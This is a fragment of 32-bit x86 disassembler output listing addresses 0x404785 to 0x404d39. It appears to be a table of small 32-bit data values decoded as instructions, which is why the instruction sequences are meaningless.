  404785:	00 00                	add    %al,(%eax)
  404787:	e5 1c                	in     $0x1c,%eax
  404789:	00 00                	add    %al,(%eax)
  40478b:	a8 21                	test   $0x21,%al
  40478d:	00 00                	add    %al,(%eax)
  40478f:	b3 25                	mov    $0x25,%bl
  404791:	00 00                	add    %al,(%eax)
  404793:	d3 03                	roll   %cl,(%ebx)
  404795:	00 00                	add    %al,(%eax)
  404797:	6b 08 00             	imul   $0x0,(%eax),%ecx
  40479a:	00 7e 2a             	add    %bh,0x2a(%esi)
  40479d:	00 00                	add    %al,(%eax)
  40479f:	63 22                	arpl   %esp,(%edx)
  4047a1:	00 00                	add    %al,(%eax)
  4047a3:	79 12                	jns    0x4047b7
  4047a5:	00 00                	add    %al,(%eax)
  4047a7:	02 12                	add    (%edx),%dl
  4047a9:	00 00                	add    %al,(%eax)
  4047ab:	64 11 00             	adc    %eax,%fs:(%eax)
  4047ae:	00 1c 02             	add    %bl,(%edx,%eax,1)
  4047b1:	00 00                	add    %al,(%eax)
  4047b3:	74 07                	je     0x4047bc
  4047b5:	00 00                	add    %al,(%eax)
  4047b7:	39 27                	cmp    %esp,(%edi)
  4047b9:	00 00                	add    %al,(%eax)
  4047bb:	4c                   	dec    %esp
  4047bc:	00 00                	add    %al,(%eax)
  4047be:	00 bf 19 00 00 33    	add    %bh,0x33000019(%edi)
  4047c4:	24 00                	and    $0x0,%al
  4047c6:	00 d8                	add    %bl,%al
  4047c8:	06                   	push   %es
  4047c9:	00 00                	add    %al,(%eax)
  4047cb:	50                   	push   %eax
  4047cc:	2e 00 00             	add    %al,%cs:(%eax)
  4047cf:	be 0b 00 00 2b       	mov    $0x2b00000b,%esi
  4047d4:	0c 00                	or     $0x0,%al
  4047d6:	00 f5                	add    %dh,%ch
  4047d8:	07                   	pop    %es
  4047d9:	00 00                	add    %al,(%eax)
  4047db:	ea 0d 00 00 49 09 00 	ljmp   $0x9,$0x4900000d
  4047e2:	00 8a 0d 00 00 dc    	add    %cl,-0x23fffff3(%edx)
  4047e8:	30 00                	xor    %al,(%eax)
  4047ea:	00 31                	add    %dh,(%ecx)
  4047ec:	09 00                	or     %eax,(%eax)
  4047ee:	00 8b 03 00 00 cd    	add    %cl,-0x32fffffd(%ebx)
  4047f4:	27                   	daa
  4047f5:	00 00                	add    %al,(%eax)
  4047f7:	0b 02                	or     (%edx),%eax
  4047f9:	00 00                	add    %al,(%eax)
  4047fb:	e4 15                	in     $0x15,%al
  4047fd:	00 00                	add    %al,(%eax)
  4047ff:	0c 29                	or     $0x29,%al
  404801:	00 00                	add    %al,(%eax)
  404803:	5c                   	pop    %esp
  404804:	10 00                	adc    %al,(%eax)
  404806:	00 bb 03 00 00 36    	add    %bh,0x36000003(%ebx)
  40480c:	1b 00                	sbb    (%eax),%eax
  40480e:	00 0c 2f             	add    %cl,(%edi,%ebp,1)
  404811:	00 00                	add    %al,(%eax)
  404813:	25 14 00 00 dc       	and    $0xdc000014,%eax
  404818:	2b 00                	sub    (%eax),%eax
  40481a:	00 46 18             	add    %al,0x18(%esi)
  40481d:	00 00                	add    %al,(%eax)
  40481f:	99                   	cltd
  404820:	22 00                	and    (%eax),%al
  404822:	00 cf                	add    %cl,%bh
  404824:	14 00                	adc    $0x0,%al
  404826:	00 a3 1c 00 00 d4    	add    %ah,-0x2bffffe4(%ebx)
  40482c:	20 00                	and    %al,(%eax)
  40482e:	00 8b 31 00 00 c1    	add    %cl,-0x3effffcf(%ebx)
  404834:	26 00 00             	add    %al,%es:(%eax)
  404837:	19 21                	sbb    %esp,(%ecx)
  404839:	00 00                	add    %al,(%eax)
  40483b:	04 09                	add    $0x9,%al
  40483d:	00 00                	add    %al,(%eax)
  40483f:	7a 2c                	jp     0x40486d
  404841:	00 00                	add    %al,(%eax)
  404843:	e9 12 00 00 bc       	jmp    0xbc40485a
  404848:	0a 00                	or     (%eax),%al
  40484a:	00 92 10 00 00 d1    	add    %dl,-0x2efffff0(%edx)
  404850:	2f                   	das
  404851:	00 00                	add    %al,(%eax)
  404853:	cc                   	int3
  404854:	0a 00                	or     (%eax),%al
  404856:	00 57 21             	add    %dl,0x21(%edi)
  404859:	00 00                	add    %al,(%eax)
  40485b:	e9 23 00 00 12       	jmp    0x12404883
  404860:	2d 00 00 f8 30       	sub    $0x30f80000,%eax
  404865:	00 00                	add    %al,(%eax)
  404867:	ec                   	in     (%dx),%al
  404868:	29 00                	sub    %eax,(%eax)
  40486a:	00 9e 29 00 00 5f    	add    %bl,0x5f000029(%esi)
  404870:	15 00 00 25 05       	adc    $0x5250000,%eax
  404875:	00 00                	add    %al,(%eax)
  404877:	2e 13 00             	adc    %cs:(%eax),%eax
  40487a:	00 7a 1c             	add    %bh,0x1c(%edx)
  40487d:	00 00                	add    %al,(%eax)
  40487f:	11 27                	adc    %esp,(%edi)
  404881:	00 00                	add    %al,(%eax)
  404883:	45                   	inc    %ebp
  404884:	28 00                	sub    %al,(%eax)
  404886:	00 78 01             	add    %bh,0x1(%eax)
  404889:	00 00                	add    %al,(%eax)
  40488b:	7c 02                	jl     0x40488f
  40488d:	00 00                	add    %al,(%eax)
  40488f:	60                   	pusha
  404890:	12 00                	adc    (%eax),%al
  404892:	00 18                	add    %bl,(%eax)
  404894:	10 00                	adc    %al,(%eax)
  404896:	00 ef                	add    %ch,%bh
  404898:	1a 00                	sbb    (%eax),%al
  40489a:	00 07                	add    %al,(%edi)
  40489c:	0d 00 00 8f 18       	or     $0x188f0000,%eax
  4048a1:	00 00                	add    %al,(%eax)
  4048a3:	18 23                	sbb    %ah,(%ebx)
  4048a5:	00 00                	add    %al,(%eax)
  4048a7:	b4 23                	mov    $0x23,%ah
  4048a9:	00 00                	add    %al,(%eax)
  4048ab:	b6 14                	mov    $0x14,%dh
  4048ad:	00 00                	add    %al,(%eax)
  4048af:	00 21                	add    %ah,(%ecx)
  4048b1:	00 00                	add    %al,(%eax)
  4048b3:	04 1d                	add    $0x1d,%al
  4048b5:	00 00                	add    %al,(%eax)
  4048b7:	78 09                	js     0x4048c2
  4048b9:	00 00                	add    %al,(%eax)
  4048bb:	a9 26 00 00 70       	test   $0x70000026,%eax
  4048c0:	0a 00                	or     (%eax),%al
  4048c2:	00 9b 2b 00 00 8c    	add    %bl,-0x73ffffd5(%ebx)
  4048c8:	11 00                	adc    %eax,(%eax)
  4048ca:	00 09                	add    %cl,(%ecx)
  4048cc:	04 00                	add    $0x0,%al
  4048ce:	00 cf                	add    %cl,%bh
  4048d0:	05 00 00 3b 26       	add    $0x263b0000,%eax
  4048d5:	00 00                	add    %al,(%eax)
  4048d7:	d5 20                	aad    $0x20
  4048d9:	00 00                	add    %al,(%eax)
  4048db:	70 15                	jo     0x4048f2
  4048dd:	00 00                	add    %al,(%eax)
  4048df:	df 0c 00             	fisttps (%eax,%eax,1)
  4048e2:	00 c0                	add    %al,%al
  4048e4:	0e                   	push   %cs
  4048e5:	00 00                	add    %al,(%eax)
  4048e7:	b0 01                	mov    $0x1,%al
  4048e9:	00 00                	add    %al,(%eax)
  4048eb:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  4048ec:	2a 00                	sub    (%eax),%al
  4048ee:	00 8b 25 00 00 95    	add    %cl,-0x6affffdb(%ebx)
  4048f4:	12 00                	adc    (%eax),%al
  4048f6:	00 2c 1d 00 00 c5 01 	add    %ch,0x1c50000(,%ebx,1)
  4048fd:	00 00                	add    %al,(%eax)
  4048ff:	df 21                	fbld   (%ecx)
  404901:	00 00                	add    %al,(%eax)
  404903:	28 22                	sub    %ah,(%edx)
  404905:	00 00                	add    %al,(%eax)
  404907:	40                   	inc    %eax
  404908:	17                   	pop    %ss
  404909:	00 00                	add    %al,(%eax)
  40490b:	e4 10                	in     $0x10,%al
  40490d:	00 00                	add    %al,(%eax)
  40490f:	e4 24                	in     $0x24,%al
  404911:	00 00                	add    %al,(%eax)
  404913:	a2 2c 00 00 f1       	mov    %al,0xf100002c
  404918:	2d 00 00 ad 27       	sub    $0x27ad0000,%eax
  40491d:	00 00                	add    %al,(%eax)
  40491f:	47                   	inc    %edi
  404920:	0a 00                	or     (%eax),%al
  404922:	00 43 31             	add    %al,0x31(%ebx)
  404925:	00 00                	add    %al,(%eax)
  404927:	74 21                	je     0x40494a
  404929:	00 00                	add    %al,(%eax)
  40492b:	cb                   	lret
  40492c:	24 00                	and    $0x0,%al
  40492e:	00 96 0b 00 00 da    	add    %dl,-0x25fffff5(%esi)
  404934:	01 00                	add    %eax,(%eax)
  404936:	00 ed                	add    %ch,%ch
  404938:	2e 00 00             	add    %al,%cs:(%eax)
  40493b:	73 2b                	jae    0x404968
  40493d:	00 00                	add    %al,(%eax)
  40493f:	82 30 00             	xorb   $0x0,(%eax)
  404942:	00 c1                	add    %al,%cl
  404944:	29 00                	sub    %eax,(%eax)
  404946:	00 de                	add    %bl,%dh
  404948:	19 00                	sbb    %eax,(%eax)
  40494a:	00 21                	add    %ah,(%ecx)
  40494c:	17                   	pop    %ss
  40494d:	00 00                	add    %al,(%eax)
  40494f:	79 10                	jns    0x404961
  404951:	00 00                	add    %al,(%eax)
  404953:	8f                   	(bad)
  404954:	15 00 00 b4 11       	adc    $0x11b40000,%eax
  404959:	00 00                	add    %al,(%eax)
  40495b:	41                   	inc    %ecx
  40495c:	11 00                	adc    %eax,(%eax)
  40495e:	00 ce                	add    %cl,%dh
  404960:	1e                   	push   %ds
  404961:	00 00                	add    %al,(%eax)
  404963:	04 19                	add    $0x19,%al
  404965:	00 00                	add    %al,(%eax)
  404967:	f9                   	stc
  404968:	1b 00                	sbb    (%eax),%eax
  40496a:	00 db                	add    %bl,%bl
  40496c:	17                   	pop    %ss
  40496d:	00 00                	add    %al,(%eax)
  40496f:	17                   	pop    %ss
  404970:	1b 00                	sbb    (%eax),%eax
  404972:	00 ee                	add    %ch,%dh
  404974:	02 00                	add    (%eax),%al
  404976:	00 17                	add    %dl,(%edi)
  404978:	01 00                	add    %eax,(%eax)
  40497a:	00 da                	add    %bl,%dl
  40497c:	2c 00                	sub    $0x0,%al
  40497e:	00 6c 25 00          	add    %ch,0x0(%ebp,%eiz,1)
  404982:	00 73 29             	add    %dh,0x29(%ebx)
  404985:	00 00                	add    %al,(%eax)
  404987:	c0 09 00             	rorb   $0x0,(%ecx)
  40498a:	00 a3 03 00 00 7b    	add    %ah,0x7b000003(%ebx)
  404990:	0f 00 00             	sldt   (%eax)
  404993:	ca 1b 00             	lret   $0x1b
  404996:	00 1f                	add    %bl,(%edi)
  404998:	0f 00 00             	sldt   (%eax)
  40499b:	1e                   	push   %ds
  40499c:	0b 00                	or     (%eax),%eax
  40499e:	00 62 04             	add    %ah,0x4(%edx)
  4049a1:	00 00                	add    %al,(%eax)
  4049a3:	ce                   	into
  4049a4:	1d 00 00 90 17       	sbb    $0x17900000,%eax
  4049a9:	00 00                	add    %al,(%eax)
  4049ab:	8e 0e                	mov    (%esi),%cs
  4049ad:	00 00                	add    %al,(%eax)
  4049af:	be 2c 00 00 3e       	mov    $0x3e00002c,%esi
  4049b4:	05 00 00 1f 0a       	add    $0xa1f0000,%eax
  4049b9:	00 00                	add    %al,(%eax)
  4049bb:	23 19                	and    (%ecx),%ebx
  4049bd:	00 00                	add    %al,(%eax)
  4049bf:	52                   	push   %edx
  4049c0:	0f 00 00             	sldt   (%eax)
  4049c3:	8a 26                	mov    (%esi),%ah
  4049c5:	00 00                	add    %al,(%eax)
  4049c7:	04 18                	add    $0x18,%al
  4049c9:	00 00                	add    %al,(%eax)
  4049cb:	6f                   	outsl  %ds:(%esi),(%dx)
  4049cc:	20 00                	and    %al,(%eax)
  4049ce:	00 74 28 00          	add    %dh,0x0(%eax,%ebp,1)
  4049d2:	00 6d 05             	add    %ch,0x5(%ebp)
  4049d5:	00 00                	add    %al,(%eax)
  4049d7:	54                   	push   %esp
  4049d8:	29 00                	sub    %eax,(%eax)
  4049da:	00 7e 14             	add    %bh,0x14(%esi)
  4049dd:	00 00                	add    %al,(%eax)
  4049df:	e7 1d                	out    %eax,$0x1d
  4049e1:	00 00                	add    %al,(%eax)
  4049e3:	1a 22                	sbb    (%edx),%ah
  4049e5:	00 00                	add    %al,(%eax)
  4049e7:	14 08                	adc    $0x8,%al
  4049e9:	00 00                	add    %al,(%eax)
  4049eb:	5a                   	pop    %edx
  4049ec:	26 00 00             	add    %al,%es:(%eax)
  4049ef:	6c                   	insb   (%dx),%es:(%edi)
  4049f0:	1f                   	pop    %ds
  4049f1:	00 00                	add    %al,(%eax)
  4049f3:	ee                   	out    %al,(%dx)
  4049f4:	0e                   	push   %cs
  4049f5:	00 00                	add    %al,(%eax)
  4049f7:	45                   	inc    %ebp
  4049f8:	04 00                	add    $0x0,%al
  4049fa:	00 d8                	add    %bl,%al
  4049fc:	07                   	pop    %es
  4049fd:	00 00                	add    %al,(%eax)
  4049ff:	b7 18                	mov    $0x18,%bh
  404a01:	00 00                	add    %al,(%eax)
  404a03:	44                   	inc    %esp
  404a04:	2b 00                	sub    (%eax),%eax
  404a06:	00 4b 03             	add    %cl,0x3(%ebx)
  404a09:	00 00                	add    %al,(%eax)
  404a0b:	19 30                	sbb    %esi,(%eax)
  404a0d:	00 00                	add    %al,(%eax)
  404a0f:	a0 2e 00 00 9a       	mov    0x9a00002e,%al
  404a14:	16                   	push   %ss
  404a15:	00 00                	add    %al,(%eax)
  404a17:	98                   	cwtl
  404a18:	20 00                	and    %al,(%eax)
  404a1a:	00 e7                	add    %ah,%bh
  404a1c:	18 00                	sbb    %al,(%eax)
  404a1e:	00 b8 17 00 00 f4    	add    %bh,-0xbffffe9(%eax)
  404a24:	27                   	daa
  404a25:	00 00                	add    %al,(%eax)
  404a27:	aa                   	stos   %al,%es:(%edi)
  404a28:	10 00                	adc    %al,(%eax)
  404a2a:	00 3c 2c             	add    %bh,(%esp,%ebp,1)
  404a2d:	00 00                	add    %al,(%eax)
  404a2f:	1d 00 00 00 ad       	sbb    $0xad000000,%eax
  404a34:	13 00                	adc    (%eax),%eax
  404a36:	00 b1 20 00 00 53    	add    %dh,0x53000020(%ecx)
  404a3c:	30 00                	xor    %al,(%eax)
  404a3e:	00 a7 0e 00 00 5f    	add    %ah,0x5f00000e(%edi)
  404a44:	18 00                	sbb    %al,(%eax)
  404a46:	00 bb 15 00 00 06    	add    %bh,0x6000015(%ebx)
  404a4c:	14 00                	adc    $0x0,%al
  404a4e:	00 2a                	add    %ch,(%edx)
  404a50:	03 00                	add    (%eax),%eax
  404a52:	00 bc 1c 00 00 84 24 	add    %bh,0x24840000(%esp,%ebx,1)
  404a59:	00 00                	add    %al,(%eax)
  404a5b:	59                   	pop    %ecx
  404a5c:	16                   	push   %ss
  404a5d:	00 00                	add    %al,(%eax)
  404a5f:	80 06 00             	addb   $0x0,(%esi)
  404a62:	00 95 23 00 00 c3    	add    %dl,-0x3cffffdd(%ebp)
  404a68:	30 00                	xor    %al,(%eax)
  404a6a:	00 75 00             	add    %dh,0x0(%ebp)
  404a6d:	00 00                	add    %al,(%eax)
  404a6f:	86 05 00 00 90 1e    	xchg   %al,0x1e900000
  404a75:	00 00                	add    %al,(%eax)
  404a77:	86 28                	xchg   %ch,(%eax)
  404a79:	00 00                	add    %al,(%eax)
  404a7b:	1b 31                	sbb    (%ecx),%esi
  404a7d:	00 00                	add    %al,(%eax)
  404a7f:	d7                   	xlat   %ds:(%ebx)
  404a80:	28 00                	sub    %al,(%eax)
  404a82:	00 10                	add    %dl,(%eax)
  404a84:	1f                   	pop    %ds
  404a85:	00 00                	add    %al,(%eax)
  404a87:	d2 0d 00 00 2b 29    	rorb   %cl,0x292b0000
  404a8d:	00 00                	add    %al,(%eax)
  404a8f:	04 2c                	add    $0x2c,%al
  404a91:	00 00                	add    %al,(%eax)
  404a93:	b2 0d                	mov    $0xd,%dl
  404a95:	00 00                	add    %al,(%eax)
  404a97:	b2 2f                	mov    $0x2f,%dl
  404a99:	00 00                	add    %al,(%eax)
  404a9b:	d2 0f                	rorb   %cl,(%edi)
  404a9d:	00 00                	add    %al,(%eax)
  404a9f:	d8 09                	fmuls  (%ecx)
  404aa1:	00 00                	add    %al,(%eax)
  404aa3:	db 08                	fisttpl (%eax)
  404aa5:	00 00                	add    %al,(%eax)
  404aa7:	77 18                	ja     0x404ac1
  404aa9:	00 00                	add    %al,(%eax)
  404aab:	42                   	inc    %edx
  404aac:	14 00                	adc    $0x0,%al
  404aae:	00 3a                	add    %bh,(%edx)
  404ab0:	0f 00 00             	sldt   (%eax)
  404ab3:	22 26                	and    (%esi),%ah
  404ab5:	00 00                	add    %al,(%eax)
  404ab7:	d3 11                	rcll   %cl,(%ecx)
  404ab9:	00 00                	add    %al,(%eax)
  404abb:	4a                   	dec    %edx
  404abc:	0c 00                	or     $0x0,%al
  404abe:	00 a8 09 00 00 a7    	add    %ch,-0x58fffff7(%eax)
  404ac4:	19 00                	sbb    %eax,(%eax)
  404ac6:	00 09                	add    %cl,(%ecx)
  404ac8:	25 00 00 57 27       	and    $0x27570000,%eax
  404acd:	00 00                	add    %al,(%eax)
  404acf:	18 11                	sbb    %dl,(%ecx)
  404ad1:	00 00                	add    %al,(%eax)
  404ad3:	cf                   	iret
  404ad4:	18 00                	sbb    %al,(%eax)
  404ad6:	00 ef                	add    %ch,%bh
  404ad8:	2a 00                	sub    (%eax),%al
  404ada:	00 ec                	add    %ch,%ah
  404adc:	17                   	pop    %ss
  404add:	00 00                	add    %al,(%eax)
  404adf:	3e 12 00             	adc    %ds:(%eax),%al
  404ae2:	00 35 07 00 00 16    	add    %dh,0x16000007
  404ae8:	13 00                	adc    (%eax),%eax
  404aea:	00 b3 08 00 00 75    	add    %dh,0x75000008(%ebx)
  404af0:	0b 00                	or     (%eax),%eax
  404af2:	00 49 0e             	add    %cl,0xe(%ecx)
  404af5:	00 00                	add    %al,(%eax)
  404af7:	72 26                	jb     0x404b1f
  404af9:	00 00                	add    %al,(%eax)
  404afb:	d6                   	salc
  404afc:	0b 00                	or     (%eax),%eax
  404afe:	00 93 0a 00 00 06    	add    %dl,0x600000a(%ebx)
  404b04:	1a 00                	sbb    (%eax),%al
  404b06:	00 bd 27 00 00 55    	add    %bh,0x55000027(%ebp)
  404b0c:	1b 00                	sbb    (%eax),%eax
  404b0e:	00 74 2d 00          	add    %dh,0x0(%ebp,%ebp,1)
  404b12:	00 c0                	add    %al,%al
  404b14:	2a 00                	sub    (%eax),%al
  404b16:	00 ea                	add    %ch,%dl
  404b18:	2f                   	das
  404b19:	00 00                	add    %al,(%eax)
  404b1b:	5b                   	pop    %ebx
  404b1c:	1f                   	pop    %ds
  404b1d:	00 00                	add    %al,(%eax)
  404b1f:	41                   	inc    %ecx
  404b20:	10 00                	adc    %al,(%eax)
  404b22:	00 54 07 00          	add    %dl,0x0(%edi,%eax,1)
  404b26:	00 2a                	add    %ch,(%edx)
  404b28:	0e                   	push   %cs
  404b29:	00 00                	add    %al,(%eax)
  404b2b:	b7 1f                	mov    $0x1f,%bh
  404b2d:	00 00                	add    %al,(%eax)
  404b2f:	df 2a                	fildll (%edx)
  404b31:	00 00                	add    %al,(%eax)
  404b33:	74 24                	je     0x404b59
  404b35:	00 00                	add    %al,(%eax)
  404b37:	ec                   	in     (%dx),%al
  404b38:	03 00                	add    (%eax),%eax
  404b3a:	00 3c 08             	add    %bh,(%eax,%ecx,1)
  404b3d:	00 00                	add    %al,(%eax)
  404b3f:	68 19 00 00 33       	push   $0x33000019
  404b44:	2d 00 00 40 20       	sub    $0x20400000,%eax
  404b49:	00 00                	add    %al,(%eax)
  404b4b:	58                   	pop    %eax
  404b4c:	1e                   	push   %ds
  404b4d:	00 00                	add    %al,(%eax)
  404b4f:	03 11                	add    (%ecx),%edx
  404b51:	00 00                	add    %al,(%eax)
  404b53:	2d 2a 00 00 4b       	sub    $0x4b00002a,%eax
  404b58:	2c 00                	sub    $0x0,%al
  404b5a:	00 f2                	add    %dh,%dl
  404b5c:	16                   	push   %ss
  404b5d:	00 00                	add    %al,(%eax)
  404b5f:	08 2b                	or     %ch,(%ebx)
  404b61:	00 00                	add    %al,(%eax)
  404b63:	f7 31                	divl   (%ecx)
  404b65:	00 00                	add    %al,(%eax)
  404b67:	03 16                	add    (%esi),%edx
  404b69:	00 00                	add    %al,(%eax)
  404b6b:	ed                   	in     (%dx),%eax
  404b6c:	13 00                	adc    (%eax),%eax
  404b6e:	00 ef                	add    %ch,%bh
  404b70:	0f 00 00             	sldt   (%eax)
  404b73:	40                   	inc    %eax
  404b74:	19 00                	sbb    %eax,(%eax)
  404b76:	00 3f                	add    %bh,(%edi)
  404b78:	01 00                	add    %eax,(%eax)
  404b7a:	00 9d 00 00 00 1b    	add    %bl,0x1b000000(%ebp)
  404b80:	0e                   	push   %cs
  404b81:	00 00                	add    %al,(%eax)
  404b83:	01 15 00 00 b6 00    	add    %edx,0xb60000
  404b89:	00 00                	add    %al,(%eax)
  404b8b:	fc                   	cld
  404b8c:	04 00                	add    $0x0,%al
  404b8e:	00 45 24             	add    %al,0x24(%ebp)
  404b91:	00 00                	add    %al,(%eax)
  404b93:	2f                   	das
  404b94:	0d 00 00 6e 1b       	or     $0x1b6e0000,%eax
  404b99:	00 00                	add    %al,(%eax)
  404b9b:	cf                   	iret
  404b9c:	31 00                	xor    %eax,(%eax)
  404b9e:	00 e7                	add    %ah,%bh
  404ba0:	1e                   	push   %ds
  404ba1:	00 00                	add    %al,(%eax)
  404ba3:	3c 1f                	cmp    $0x1f,%al
  404ba5:	00 00                	add    %al,(%eax)
  404ba7:	37                   	aaa
  404ba8:	32 00                	xor    (%eax),%al
  404baa:	00 15 2a 00 00 10    	add    %dl,0x1000002a
  404bb0:	1e                   	push   %ds
  404bb1:	00 00                	add    %al,(%eax)
  404bb3:	f2 1f                	repnz pop %ds
  404bb5:	00 00                	add    %al,(%eax)
  404bb7:	96                   	xchg   %eax,%esi
  404bb8:	1b 00                	sbb    (%eax),%eax
  404bba:	00 b9 1b 00 00 c6    	add    %bh,-0x39ffffe5(%ecx)
  404bc0:	1a 00                	sbb    (%eax),%al
  404bc2:	00 27                	add    %ah,(%edi)
  404bc4:	2e 00 00             	add    %al,%cs:(%eax)
  404bc7:	07                   	pop    %es
  404bc8:	0f 00 00             	sldt   (%eax)
  404bcb:	54                   	push   %esp
  404bcc:	25 00 00 a6 05       	and    $0x5a60000,%eax
  404bd1:	00 00                	add    %al,(%eax)
  404bd3:	2b 16                	sub    (%esi),%edx
  404bd5:	00 00                	add    %al,(%eax)
  404bd7:	ad                   	lods   %ds:(%esi),%eax
  404bd8:	02 00                	add    (%eax),%al
  404bda:	00 8e 27 00 00 f4    	add    %cl,-0xbffffd9(%esi)
  404be0:	00 00                	add    %al,(%eax)
  404be2:	00 0c 07             	add    %cl,(%edi,%eax,1)
  404be5:	00 00                	add    %al,(%eax)
  404be7:	71 0e                	jno    0x404bf7
  404be9:	00 00                	add    %al,(%eax)
  404beb:	2f                   	das
  404bec:	1f                   	pop    %ds
  404bed:	00 00                	add    %al,(%eax)
  404bef:	9c                   	pushf
  404bf0:	1d 00 00 74 2f       	sbb    $0x2f740000,%eax
  404bf5:	00 00                	add    %al,(%eax)
  404bf7:	7a 04                	jp     0x404bfd
  404bf9:	00 00                	add    %al,(%eax)
  404bfb:	2b 2f                	sub    (%edi),%ebp
  404bfd:	00 00                	add    %al,(%eax)
  404bff:	c0 06 00             	rolb   $0x0,(%esi)
  404c02:	00 a3 15 00 00 d6    	add    %ah,-0x29ffffeb(%ebx)
  404c08:	0e                   	push   %cs
  404c09:	00 00                	add    %al,(%eax)
  404c0b:	f0 06                	lock push %es
  404c0d:	00 00                	add    %al,(%eax)
  404c0f:	8e 19                	mov    (%ecx),%ds
  404c11:	00 00                	add    %al,(%eax)
  404c13:	d5 00                	aad    $0x0
  404c15:	00 00                	add    %al,(%eax)
  404c17:	88 0c 00             	mov    %cl,(%eax,%eax,1)
  404c1a:	00 c4                	add    %al,%ah
  404c1c:	2e 00 00             	add    %al,%cs:(%eax)
  404c1f:	93                   	xchg   %eax,%ebx
  404c20:	21 00                	and    %eax,(%eax)
  404c22:	00 03                	add    %al,(%ebx)
  404c24:	0e                   	push   %cs
  404c25:	00 00                	add    %al,(%eax)
  404c27:	97                   	xchg   %eax,%edi
  404c28:	04 00                	add    $0x0,%al
  404c2a:	00 b5 07 00 00 3c    	add    %dh,0x3c000007(%ebp)
  404c30:	2f                   	das
  404c31:	00 00                	add    %al,(%eax)
  404c33:	7b 1a                	jnp    0x404c4f
  404c35:	00 00                	add    %al,(%eax)
  404c37:	a3 1a 00 00 35       	mov    %eax,0x3500001a
  404c3c:	23 00                	and    (%eax),%eax
  404c3e:	00 68 17             	add    %ch,0x17(%eax)
  404c41:	00 00                	add    %al,(%eax)
  404c43:	33 1e                	xor    (%esi),%ebx
  404c45:	00 00                	add    %al,(%eax)
  404c47:	1f                   	pop    %ds
  404c48:	32 00                	xor    (%eax),%al
  404c4a:	00 74 1d 00          	add    %dh,0x0(%ebp,%ebx,1)
  404c4e:	00 21                	add    %ah,(%ecx)
  404c50:	12 00                	adc    (%eax),%al
  404c52:	00 41 22             	add    %al,0x22(%ecx)
  404c55:	00 00                	add    %al,(%eax)
  404c57:	e2 25                	loop   0x404c7e
  404c59:	00 00                	add    %al,(%eax)
  404c5b:	23 2c 00             	and    (%eax,%eax,1),%ebp
  404c5e:	00 35 02 00 00 69    	add    %dh,0x69000002
  404c64:	0c 00                	or     $0x0,%al
  404c66:	00 73 22             	add    %dh,0x22(%ebx)
  404c69:	00 00                	add    %al,(%eax)
  404c6b:	de 22                	fisubs (%edx)
  404c6d:	00 00                	add    %al,(%eax)
  404c6f:	af                   	scas   %es:(%edi),%eax
  404c70:	1e                   	push   %ds
  404c71:	00 00                	add    %al,(%eax)
  404c73:	8c 22                	mov    %fs,(%edx)
  404c75:	00 00                	add    %al,(%eax)
  404c77:	58                   	pop    %eax
  404c78:	0d 00 00 a8 31       	or     $0x31a80000,%eax
  404c7d:	00 00                	add    %al,(%eax)
  404c7f:	fe                   	(bad)
  404c80:	2d 00 00 8c 29       	sub    $0x298c0000,%eax
  404c85:	00 00                	add    %al,(%eax)
  404c87:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  404c88:	0c 00                	or     $0x0,%al
  404c8a:	00 66 23             	add    %ah,0x23(%esi)
  404c8d:	00 00                	add    %al,(%eax)
  404c8f:	95                   	xchg   %eax,%ebp
  404c90:	02 00                	add    (%eax),%al
  404c92:	00 9a 30 00 00 c2    	add    %bl,-0x3dffffd0(%edx)
  404c98:	10 00                	adc    %al,(%eax)
  404c9a:	00 62 14             	add    %ah,0x14(%edx)
  404c9d:	00 00                	add    %al,(%eax)
  404c9f:	6c                   	insb   (%dx),%es:(%edi)
  404ca0:	31 00                	xor    %eax,(%eax)
  404ca2:	00 e5                	add    %ah,%ch
  404ca4:	27                   	daa
  404ca5:	00 00                	add    %al,(%eax)
  404ca7:	e8 14 00 00 d0       	call   0xd0404cc0
  404cac:	21 00                	and    %eax,(%eax)
  404cae:	00 b5 1d 00 00 8c    	add    %dh,-0x73ffffe3(%ebp)
  404cb4:	07                   	pop    %es
  404cb5:	00 00                	add    %al,(%eax)
  404cb7:	0b 24 00             	or     (%eax,%eax,1),%esp
  404cba:	00 fb                	add    %bh,%bl
  404cbc:	21 00                	and    %eax,(%eax)
  404cbe:	00 46 13             	add    %al,0x13(%esi)
  404cc1:	00 00                	add    %al,(%eax)
  404cc3:	2d 18 00 00 cf       	sub    $0xcf000018,%eax
  404cc8:	22 00                	and    (%eax),%al
  404cca:	00 bd 12 00 00 fa    	add    %bh,-0x5ffffee(%ebp)
  404cd0:	2c 00                	sub    $0x0,%al
  404cd2:	00 30                	add    %dh,(%eax)
  404cd4:	15 00 00 13 0c       	adc    $0xc130000,%eax
  404cd9:	00 00                	add    %al,(%eax)
  404cdb:	77 1e                	ja     0x404cfb
  404cdd:	00 00                	add    %al,(%eax)
  404cdf:	e0 26                	loopne 0x404d07
  404ce1:	00 00                	add    %al,(%eax)
  404ce3:	d2 2d 00 00 2b 2b    	shrb   %cl,0x2b2b0000
  404ce9:	00 00                	add    %al,(%eax)
  404ceb:	4b                   	dec    %ebx
  404cec:	1d 00 00 1e 1a       	sbb    $0x1a1e0000,%eax
  404cf1:	00 00                	add    %al,(%eax)
  404cf3:	07                   	pop    %es
  404cf4:	0a 00                	or     (%eax),%al
  404cf6:	00 4d 0b             	add    %cl,0xb(%ebp)
  404cf9:	00 00                	add    %al,(%eax)
  404cfb:	73 03                	jae    0x404d00
  404cfd:	00 00                	add    %al,(%eax)
  404cff:	f0 28 00             	lock sub %al,(%eax)
  404d02:	00 21                	add    %ah,(%ecx)
  404d04:	20 00                	and    %al,(%eax)
  404d06:	00 8f 1f 00 00 3b    	add    %cl,0x3b00001f(%edi)
  404d0c:	1a 00                	sbb    (%eax),%al
  404d0e:	00 9d 14 00 00 c0    	add    %bl,-0x3fffffec(%ebp)
  404d14:	04 00                	add    $0x0,%al
  404d16:	00 87 2e 00 00 ef    	add    %al,-0x10ffffd2(%edi)
  404d1c:	22 00                	and    (%eax),%al
  404d1e:	00 7e 13             	add    %bh,0x13(%esi)
  404d21:	00 00                	add    %al,(%eax)
  404d23:	f4                   	hlt
  404d24:	0a 00                	or     (%eax),%al
  404d26:	00 6f 2e             	add    %ch,0x2e(%edi)
  404d29:	00 00                	add    %al,(%eax)
  404d2b:	4e                   	dec    %esi
  404d2c:	23 00                	and    (%eax),%eax
  404d2e:	00 1c 28             	add    %bl,(%eax,%ebp,1)
  404d31:	00 00                	add    %al,(%eax)
  404d33:	2b 25 00 00 b9 0f    	sub    0xfb90000,%esp
  404d39:	00 00                	add    %al,(%eax)
